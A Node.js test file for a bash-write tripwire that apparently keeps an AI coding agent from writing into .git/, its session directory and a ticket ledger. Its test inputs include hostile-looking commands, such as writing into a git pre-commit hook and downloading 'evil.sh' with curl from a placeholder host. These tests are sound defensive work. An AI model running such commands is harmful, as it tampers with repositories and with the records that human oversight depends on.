#!/usr/bin/env node
/**
 * DIA-260827-ft3z task 1.2: pure bash-tripwire-classifier RED tests
 * (test-author pass).
 *
 * Subject: .opencode/plugins/lib/bash-write-gate.ts (design.md D5 seam; the
 * implementer lands it in task 4.1, then wires it into tool.execute.before in
 * task 4.2). Contract pinned here:
 *   classifyBashWrite(command, lane)
 *     -> { blocked: false }
 *      | { blocked: true, target: string, rule: string }
 * Protected literals: .git/, .opencode/session/,
 * docs/dev-infra-audit/tickets/. Explicit form set only (redirection, tee,
 * curl -o, ...); lane scope is coder only, fail-open for an
 * unresolvable lane - accident protection, never a boundary.
 *
 * SEAM DECISION: plain Node ESM importing the pure .ts module directly.
 * Node 24.18 (the .mise.toml / Dockerfile.dev pin) strips types natively,
 * the same proven pattern as scripts/__tests__/routing-order-gate.test.mjs
 * importing .opencode/plugins/lib/routing-gate.ts. No build step, no bun
 * harness (the bun plugin harness is task 4.4's hook-level seam, not this
 * pure-classifier seam).
 *
 * EXPECTED RED at this commit: the module does not exist yet, so the suite
 * fails at import with ERR_MODULE_NOT_FOUND. That is the point of task 1.2.
 *
 * Run: node scripts/__tests__/tripwire-classifier.test.mjs
 * Wired into `make test-config`.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

// Production seam - created by task 4.1 (implementer lane), not by this suite.
import { classifyBashWrite } from '../../.opencode/plugins/lib/bash-write-gate.ts';

describe('DIA-260827-ft3z bash write tripwire classifier (task 1.2)', () => {
  it('blocks a redirection into .git/', () => {
    const v = classifyBashWrite('echo pwned > .git/hooks/pre-commit', 'coder');
    assert.equal(v.blocked, true, 'redirection to .git/ must be blocked');
    assert.ok(
      String(v.target).includes('.git/'),
      'the denial must name the protected target, got: ' + v.target,
    );
    assert.equal(typeof v.rule, 'string', 'the denial must name the rule that fired');
    assert.ok(String(v.rule).length > 0, 'the denial rule must not be empty');
  });

  it('blocks tee into the ticket ledger', () => {
    const v = classifyBashWrite('tee docs/dev-infra-audit/tickets/DIA-260827-ft3z.md', 'coder');
    assert.equal(v.blocked, true, 'tee into the ticket ledger must be blocked');
    assert.ok(
      String(v.target).includes('docs/dev-infra-audit/tickets/'),
      'the denial must name the protected target, got: ' + v.target,
    );
    assert.equal(typeof v.rule, 'string', 'the denial must name the rule that fired');
    assert.ok(String(v.rule).length > 0, 'the denial rule must not be empty');
  });

  it('blocks curl -o to a protected path', () => {
    const v = classifyBashWrite('curl -o .opencode/session/evil.sh http://x', 'coder');
    assert.equal(v.blocked, true, 'curl -o into .opencode/session/ must be blocked');
    assert.ok(
      String(v.target).includes('.opencode/session/'),
      'the denial must name the protected target, got: ' + v.target,
    );
    assert.equal(typeof v.rule, 'string', 'the denial must name the rule that fired');
    assert.ok(String(v.rule).length > 0, 'the denial rule must not be empty');
  });

  it('allows an ordinary pnpm test', () => {
    const v = classifyBashWrite('pnpm test', 'coder');
    assert.equal(v.blocked, false, 'an ordinary build/test command must pass unchanged');
  });

  it('does not apply to lanes other than coder', () => {
    // Same protected literal, out-of-scope lanes: the tripwire must not fire.
    // The coder in-scope leg is pinned here too, so this case fails if the
    // scope set is ever widened or emptied again.
    assert.equal(
      classifyBashWrite('echo pwned > .git/config', 'coder').blocked,
      true,
      'coder is in scope',
    );
    assert.equal(
      classifyBashWrite('echo pwned > .git/config', 'researcher').blocked,
      false,
      'researcher is out of scope',
    );
    assert.equal(
      classifyBashWrite('echo pwned > .git/config', 'reviewer').blocked,
      false,
      'reviewer is out of scope',
    );
    assert.equal(
      classifyBashWrite('echo pwned > .git/config', 'coder-escalated').blocked,
      false,
      'coder-escalated is out of scope (lane retired, DIA-261112-exon)',
    );
  });

  it('fails open when the lane cannot be resolved', () => {
    // design.md D5 fail-open set: no resolvable lane, no tripwire - the
    // command proceeds to the permission layer.
    assert.equal(
      classifyBashWrite('echo pwned > .git/config', undefined).blocked,
      false,
      'an unresolvable lane must fail open',
    );
  });
});
